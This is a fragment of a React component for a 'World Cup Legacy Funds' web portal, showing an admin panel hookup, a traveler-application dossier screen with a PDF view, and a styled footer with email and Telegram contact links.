                onAddAnnouncement={handleAddAnnouncement} tickets={tickets}
                onAdminResponse={handleAdminTicketResponse}
                onSendDirectMessage={handleSendDirectMessage}
                onLogout={() => { setActiveUser(null); setCurrentScreen('home'); }}
              />
            </div>
          )}

          {currentScreen === 'dossier' && activeTravelerApp && (
            <div style={{ padding: '24px 16px 0' }}>
              <button onClick={() => setCurrentScreen('journey')}
                style={{ background: 'none', border: 'none', cursor: 'pointer', fontSize: '14px', color: '#8B8FA8', marginBottom: '24px', display: 'inline-flex', alignItems: 'center', gap: '5px' }}>
                ← Back to portal
              </button>
              <DossierPDF application={activeTravelerApp} lang={currentLanguage} />
            </div>
          )}
        </div>
      </main>

      {/* ── FOOTER ── */}
      <footer style={{
        background: '#FFFFFF',
        borderTop: '1px solid rgba(0, 0, 0, 0.06)',
        padding: '32px 24px',
      }}>
        <div style={{
          maxWidth: '1120px', margin: '0 auto',
          display: 'flex', flexDirection: 'column', gap: '20px',
        }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '16px' }}>
            <img src="/logo.png" alt="WCLF" style={{ height: '60px', width: 'auto' }} />
            <div style={{ display: 'flex', alignItems: 'center', gap: '20px', flexWrap: 'wrap' }}>
              {/* Email */}
              <a href="mailto:support@worldcuplegacyfunds.online" style={{ display: 'flex', alignItems: 'center', gap: '7px', textDecoration: 'none', color: '#5C617F', fontSize: '13px', fontWeight: 600, transition: 'color 0.2s' }}
                onMouseEnter={e => e.currentTarget.style.color = '#796BFF'} onMouseLeave={e => e.currentTarget.style.color = '#5C617F'}>
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/>
                </svg>
                support@worldcuplegacyfunds.online
              </a>
              {/* Telegram */}
              <a href="https://t.me/worldcuplegacyfunds" target="_blank" rel="noopener noreferrer" style={{ display: 'flex', alignItems: 'center', gap: '7px', textDecoration: 'none', color: '#5C617F', fontSize: '13px', fontWeight: 600, transition: 'color 0.2s' }}
                onMouseEnter={e => e.currentTarget.style.color = '#796BFF'} onMouseLeave={e => e.currentTarget.style.color = '#5C617F'}>
                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12L8.32 14.617l-2.96-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.828.942z"/>
                </svg>
                @worldcuplegacyfunds
              </a>
            </div>
          </div>
          <div style={{ height: '1px', background: 'rgba(0,0,0,0.06)' }} />
          <p style={{ fontSize: '11px', color: '#8B8FA8', margin: 0, textAlign: 'center' }}>
            © 2026 WCLF. All rights reserved.
          </p>
        </div>
      </footer>
    </div>
  );
}
